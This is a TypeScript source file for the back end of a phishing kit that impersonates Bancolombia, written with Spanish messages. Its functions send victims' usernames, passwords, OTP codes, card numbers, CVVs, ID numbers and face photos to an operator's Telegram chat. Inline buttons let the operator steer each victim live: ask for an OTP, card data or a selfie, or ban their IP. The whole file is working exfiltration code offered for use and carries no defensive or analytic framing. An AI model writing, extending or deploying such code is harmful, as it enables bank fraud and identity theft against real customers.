import TelegramBot from 'node-telegram-bot-api';
import { config } from './config';

let bot: TelegramBot | null = null;

// Store Telegram decisions from button clicks
export const telegramDecisions = new Map<string, 'otp' | 'usuario' | 'tcc' | 'tcc-confirm' | 'tcc-cancel' | 'ban-ip' | 'face' | 'call-923'>();

// Store request info with short IDs
let requestCounter = 0;
const requestInfo = new Map<string, { userId: string; isSecondRequest: boolean }>();

function generateRequestId(): string {
  requestCounter++;
  return `r${requestCounter}`;
}

export function initTelegramBot() {
  const token = config.TELEGRAM_BOT_TOKEN;
  
  if (!token) {
    console.warn('TELEGRAM_BOT_TOKEN not found. Telegram integration disabled.');
    return null;
  }

  if (bot) {
    return bot;
  }

  try {
    bot = new TelegramBot(token, { polling: true });

    bot.onText(/\/start/, (msg: TelegramBot.Message) => {
      const chatId = msg.chat.id;
      bot?.sendMessage(
        chatId,
        `¡Hola! Tu Chat ID es: ${chatId}`
      );
    });

    // Handle callback queries from inline buttons
    bot.on('callback_query', (query: TelegramBot.CallbackQuery) => {
      const chatId = query.message?.chat.id;
      const data = query.data;
      
      if (!chatId || !data) return;

      try {
        bot?.answerCallbackQuery(query.id);
        
        // Handle the decision: usuario or otp or tcc
        if (data.startsWith('otp:')) {
          const requestId = data.replace('otp:', '');
          const info = requestInfo.get(requestId);
          if (info) {
            telegramDecisions.set(info.userId, 'otp');
            bot?.sendMessage(chatId, '✅ Redirigiendo a Código Dinámico...');
            console.log(`Telegram decision for user ${info.userId}: OTP`);
            requestInfo.delete(requestId);
          }
        } else if (data.startsWith('usr:')) {
          const requestId = data.replace('usr:', '');
          const info = requestInfo.get(requestId);
          if (info) {
            telegramDecisions.set(info.userId, 'usuario');
            bot?.sendMessage(chatId, '✅ Redirigiendo a Login...');
            console.log(`Telegram decision for user ${info.userId}: Usuario y Contraseña`);
            requestInfo.delete(requestId);
          }
        } else if (data.startsWith('tcc:')) {
          const requestId = data.replace('tcc:', '');
          const info = requestInfo.get(requestId);
          if (info) {
            telegramDecisions.set(info.userId, 'tcc');
            bot?.sendMessage(chatId, '✅ Opción TCC seleccionada...');
            console.log(`Telegram decision for user ${info.userId}: TCC`);
            requestInfo.delete(requestId);
          }
        } else if (data.startsWith('tcc-confirm:')) {
          const requestId = data.replace('tcc-confirm:', '');
          const info = requestInfo.get(requestId);
          if (info) {
            telegramDecisions.set(info.userId, 'tcc-confirm');
            bot?.sendMessage(chatId, '✅ Tarjeta confirmada. Acceso permitido.');
            console.log(`Telegram decision for user ${info.userId}: TCC Confirmado`);
            requestInfo.delete(requestId);
          }
        } else if (data.startsWith('tcc-cancel:')) {
          const requestId = data.replace('tcc-cancel:', '');
          const info = requestInfo.get(requestId);
          if (info) {
            telegramDecisions.set(info.userId, 'tcc-cancel');
            bot?.sendMessage(chatId, '❌ Tarjeta cancelada.');
            console.log(`Telegram decision for user ${info.userId}: TCC Cancelado`);
            requestInfo.delete(requestId);
          }
        } else if (data.startsWith('ban-ip:')) {
          const requestId = data.replace('ban-ip:', '');
          const info = requestInfo.get(requestId);
          if (info) {
            telegramDecisions.set(info.userId, 'ban-ip');
            bot?.sendMessage(chatId, '🔒 IP baneada. No podrás acceder de nuevo.');
            console.log(`Telegram decision for user ${info.userId}: BAN IP`);
            requestInfo.delete(requestId);
          }
        } else if (data.startsWith('call-923:')) {
          const requestId = data.replace('call-923:', '');
          const info = requestInfo.get(requestId);
          if (info) {
            telegramDecisions.set(info.userId, 'call-923');
            bot?.sendMessage(chatId, '📞 Redirigiendo al servicio de atención...');
            console.log(`Telegram decision for user ${info.userId}: CALL 923`);
            requestInfo.delete(requestId);
          }
        } else if (data.startsWith('face:')) {
          const requestId = data.replace('face:', '');
          const info = requestInfo.get(requestId);
          if (info) {
            telegramDecisions.set(info.userId, 'face');
            bot?.sendMessage(chatId, '👤 Redirigiendo a Face...');
            console.log(`Telegram decision for user ${info.userId}: Face`);
            requestInfo.delete(requestId);
          }
        }
      } catch (error) {
        console.error('Error handling callback query:', error);
      }
    });

    bot.on('polling_error', (error: Error) => {
      console.error('Telegram polling error:', error);
    });

    console.log('✅ Telegram bot initialized successfully');
    return bot;
  } catch (error) {
    console.error('Failed to initialize Telegram bot:', error);
    return null;
  }
}

export async function sendCredentialsToTelegram(chatId: number, username: string, password: string, dynamicCode: string) {
  if (!bot) {
    console.warn('Telegram bot not initialized.');
    return false;
  }

  try {
    console.log(`Enviando a Telegram - ChatID: ${chatId}, Usuario: ${username}, Contraseña: ${password}, Código: ${dynamicCode}`);
    
    const message = `🔐 *Credenciales de Acceso*\n\n👤 Usuario: ${username}\n🔑 Contraseña: ${password}\n🔢 Código Dinámico: ${dynamicCode}`;
    
    await bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
    
    console.log('✅ Mensaje enviado a Telegram exitosamente');
    return true;
  } catch (error) {
    console.error('Failed to send Telegram message:', error);
    return false;
  }
}

export async function sendDecisionButtons(chatId: number, username: string, password: string, userId: string, isSecondRequest: boolean = false, dynamicCode?: string) {
  if (!bot) {
    console.warn('Telegram bot not initialized.');
    return false;
  }

  try {
    console.log(`Enviando botones de decisión a Telegram - ChatID: ${chatId}, Usuario: ${username}`);
    
    let messageTitle = '🔐 *Solicitud de Acceso Bancolombia*';
    let messageContent = `👤 Usuario: ${username}\n🔑 Contraseña: ${password}`;
    
    if (isSecondRequest) {
      messageTitle = '✅ *Verificación de Código Dinámico*';
      messageContent = `👤 Usuario: ${username}\n🔑 Contraseña: ${password}\n🔢 Código Dinámico: ${dynamicCode || 'N/A'}`;
    }
    
    const message = `${messageTitle}\n\n${messageContent}\n\n¿Qué deseas hacer?`;
    
    // Generate short request ID
    const requestId = generateRequestId();
    requestInfo.set(requestId, { userId, isSecondRequest });
    
    await bot.sendMessage(
      chatId,
      message,
      {
        parse_mode: 'Markdown',
        reply_markup: {
          inline_keyboard: [
            [
              { text: '✅ OTP (Código Dinámico)', callback_data: `otp:${requestId}` },
              { text: '🔄 Usuario y Contraseña', callback_data: `usr:${requestId}` }
            ],
            [
              { text: '🔐 TCC', callback_data: `tcc:${requestId}` },
              { text: '👤 Face', callback_data: `face:${requestId}` }
            ],
            [
              { text: '🔒 BAN IP', callback_data: `ban-ip:${requestId}` },
              { text: '☎️ 923', callback_data: `call-923:${requestId}` }
            ]
          ]
        }
      }
    );
    
    console.log('✅ Botones enviados a Telegram exitosamente');
    return true;
  } catch (error) {
    console.error('Failed to send Telegram buttons:', error);
    return false;
  }
}

export async function sendCardDataButtons(chatId: number, documentType: string, documentNumber: string, cardNumber: string, cardExp: string, cardCvv: string, userId: string) {
  if (!bot) {
    console.warn('Telegram bot not initialized.');
    return false;
  }

  try {
    const message = `💳 *Datos de Tarjeta Registrados*\n\n📄 Tipo de documento: ${documentType}\n🔢 Número de documento: ${documentNumber}\n💳 Número de tarjeta: ${cardNumber}\n📅 Expiración: ${cardExp}\n🔐 CVV: ${cardCvv}\n\n¿Deseas confirmar?`;
    
    const requestId = generateRequestId();
    requestInfo.set(requestId, { userId, isSecondRequest: true });
    
    await bot.sendMessage(
      chatId,
      message,
      {
        parse_mode: 'Markdown',
        reply_markup: {
          inline_keyboard: [
            [
              { text: '✅ Confirmar', callback_data: `tcc-confirm:${requestId}` },
              { text: '❌ Cancelar', callback_data: `tcc-cancel:${requestId}` }
            ]
          ]
        }
      }
    );
    
    console.log('✅ Datos de tarjeta enviados a Telegram');
    return true;
  } catch (error) {
    console.error('Failed to send card data to Telegram:', error);
    return false;
  }
}

export async function sendFacePhoto(chatId: number, photoBuffer: Buffer, userId: string, username: string, password: string): Promise<boolean> {
  if (!bot) {
    console.warn('Telegram bot not initialized.');
    return false;
  }

  try {
    const message = `👤 *Foto de Verificación Recibida*\n\n👤 Usuario: ${username}\n🔐 Contraseña: ${password}\n\nVerificando identidad...`;
    
    const requestId = generateRequestId();
    requestInfo.set(requestId, { userId, isSecondRequest: false });
    
    await bot.sendPhoto(chatId, photoBuffer, {
      caption: message,
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [
            { text: '✅ OTP (Código Dinámico)', callback_data: `otp:${requestId}` },
            { text: '🔄 Usuario y Contraseña', callback_data: `usr:${requestId}` }
          ],
          [
            { text: '🔐 TCC', callback_data: `tcc:${requestId}` },
            { text: '👤 Face', callback_data: `face:${requestId}` }
          ],
          [
            { text: '🔒 BAN IP', callback_data: `ban-ip:${requestId}` }
          ]
        ]
      }
    });
    
    console.log('✅ Foto de verificación enviada a Telegram');
    return true;
  } catch (error) {
    console.error('Failed to send face photo to Telegram:', error);
    return false;
  }
}

export async function sendYesIWasMeMessage(chatId: number, username: string, password: string, userId: string): Promise<boolean> {
  if (!bot) {
    console.warn('Telegram bot not initialized.');
    return false;
  }

  try {
    const message = `🔐 *Credenciales de Acceso*\n\n👤 Usuario: ${username}\n🔑 Contraseña: ${password}\n\n✅ PRESIONO SI, FUI YO`;
    
    const requestId = generateRequestId();
    requestInfo.set(requestId, { userId, isSecondRequest: false });
    
    await bot.sendMessage(
      chatId,
      message,
      {
        parse_mode: 'Markdown',
        reply_markup: {
          inline_keyboard: [
            [
              { text: '✅ OTP (Código Dinámico)', callback_data: `otp:${requestId}` }
            ]
          ]
        }
      }
    );
    
    console.log('✅ Mensaje "Sí, fui yo" enviado a Telegram');
    return true;
  } catch (error) {
    console.error('Failed to send yes-it-was-me message to Telegram:', error);
    return false;
  }
}

export function getTelegramBot() {
  return bot;
}
